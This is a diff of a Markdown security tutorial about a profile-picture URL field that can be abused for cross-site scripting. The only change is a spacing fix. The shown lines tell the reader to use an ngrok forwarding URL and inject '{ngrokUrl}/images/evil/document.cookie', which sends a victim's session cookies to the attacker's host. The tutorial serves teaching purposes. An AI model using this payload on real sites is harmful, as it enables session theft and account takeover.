@@ -68,7 +68,7 @@ Here, the app asks for an URL containing an img to have as a profile picture. Se
 
 Well, turns out that here we can inject malicious URL. The URL is not malicious itself, but the content is.
 
-Now lets inject a malicious content, go to the terminal you run ngrok server, copy the forwarding URL (Example: https://e602-190-57-211-204.ngrok-free.app)and put this value inside the input
+Now lets inject a malicious content, go to the terminal you run ngrok server, copy the forwarding URL (Example: https://e602-190-57-211-204.ngrok-free.app) and put this value inside the input
 **{ngrokUrl}/images/evil/document.cookie**
 
 We'll see the alert prompting again, but what happened?
